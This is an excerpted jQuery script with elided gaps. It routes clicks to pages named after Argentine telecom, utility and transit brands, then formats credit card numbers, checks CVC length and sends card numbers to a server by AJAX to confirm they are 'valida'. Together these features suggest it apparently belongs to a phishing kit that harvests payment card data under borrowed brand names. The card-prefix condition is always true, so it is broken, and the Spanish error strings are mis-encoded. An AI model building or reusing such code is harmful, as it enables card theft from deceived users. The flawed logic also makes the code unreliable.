...
$("#tuenti").click(function(){
	window.location.href="tuenti.html";
});
$("#claro").click(function(){
	window.location.href="claro.html";
});
$("#movistar").click(function(){
	window.location.href="movistar.html";
});
$("#edenor").click(function(){
	window.location.href="edenor.html";
});
$("#directv").click(function(){
	window.location.href="directv.html";
});
$("#antina").click(function(){
	window.location.href="antina.html";
});
$("#sube").click(function(){
    window.location.href="sube.html";
});
...
$("#cellphone2").bind('keypress', function (event) {
    var regex = new RegExp("^[0-9\b]+$");
    var key = String.fromCharCode(!event.charCode
        ? event.which
        : event.charCode);
...
$("#cellphone").attr({"minlength": 10, "maxlength": 10});
$("#cellphone2").attr({"minlength": 7, "maxlength": 15});
...
$("#cvc").focusout(function () {
    if ($("#cvc").val().length < $("#cvc").attr("minlength")) {
        error("cvc", "CÃ³digo de seguridad invÃ¡lido")
    } else {
        success("cvc", "CVC")
    }
});
        ...
        if (card != "34" || card != "35" || card != "36" || card != "37") {
            $.ajax({
                ...
                success: function (response) {
                    if (response == "valida") {
                        success("card", "NÃºmero de tarjeta")
                    } else {
                        error("card", "NÃºmero de tarjeta no valido")
                    }
                }
            })
        }
...
function otra_card() {
    var numeros = document
        .getElementById("card")
        .value;
    $("#card").attr({"maxlength": 23, "minlength": 19});
    $("#cvc").attr({"maxlength": 4, "minlength": 3});
    var cvc3 = document
        .getElementById("cvc")
        .value;
    cvc3 = cvc3.substr(0, 4);
    $("#cvc").val(cvc3);
    var numres = numeros.replace(/ /g, "");
    if (numres.length == 0) {
        document
        ...
        document
            .getElementById("card")
            .value = num1 + " " + num2 + " " + num3 + " " + num4
    } else if (numres.length == 17) {
        var num1 = numres.substr(0, 4);
        var num2 = numres.substr(4, 4);
        var num3 = numres.substr(8, 4);
        var num4 = numres.substr(12, 4);
        var num5 = numres.substr(16, 1);
        document
            .getElementById("card")
        ...
        var num3 = numres.substr(8, 4);
        var num4 = numres.substr(12, 4);
        var num5 = numres.substr(16, 2);
        document
            .getElementById("card")
            .value = num1 + " " + num2 + " " + num3 + " " + num4 + " " + num5
    } else if (numres.length == 19) {
        var num1 = numres.substr(0, 4);
        var num2 = numres.substr(4, 4);
        var num3 = numres.substr(8, 4);
        var num4 = numres.substr(12, 4);
        var num5 = numres.substr(16, 3);
        document
            .getElementById("card")
            .value = num1 + " " + num2 + " " + num3 + " " + num4 + " " + num5
    }
